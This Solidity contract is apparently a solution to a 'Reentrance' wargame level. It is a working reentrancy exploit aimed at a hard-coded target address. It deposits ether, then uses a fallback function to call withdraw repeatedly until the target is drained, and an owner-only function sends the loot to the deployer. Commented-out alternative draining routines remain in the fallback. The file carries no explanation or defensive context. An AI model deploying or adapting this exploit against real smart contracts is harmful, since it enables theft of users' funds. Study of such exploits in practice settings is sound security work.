// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
}

contract ReentranceAttack {
    address public owner;
    IReentrance  targetContract;
    address targetAddr = address(0x5d666C9A52145478479709ed430b003de4D3A297);
    uint targetValue = 0.005 ether;

    event ReceiveLog(uint256 value);

    constructor() public {
        targetContract = IReentrance(targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        IReentrance(targetContract).donate{value: msg.value}(targetAddr);
        // targetContract.withdraw(msg.value);
    }

    function claim(uint256 _amount) public {
        targetContract.withdraw(_amount);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: totalBalance}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    fallback() external payable {

        // if (targetContract.balanceOf(address(this)) < address(targetContract).balance) {
        //     targetContract.withdraw(targetContract.balanceOf(address(this)));
        // }
        // else {
        //     targetContract.withdraw(address(targetContract).balance);
        // }

        // emit ReceiveLog(msg.value);

        // uint targetBalance = address(targetContract).balance;
        // if (targetBalance > 0) {
        //   targetContract.withdraw(targetBalance);
        // }

        targetContract.withdraw(msg.value);
    }

    function collect() public payable returns(uint) {
        return address(this).balance;
    }
}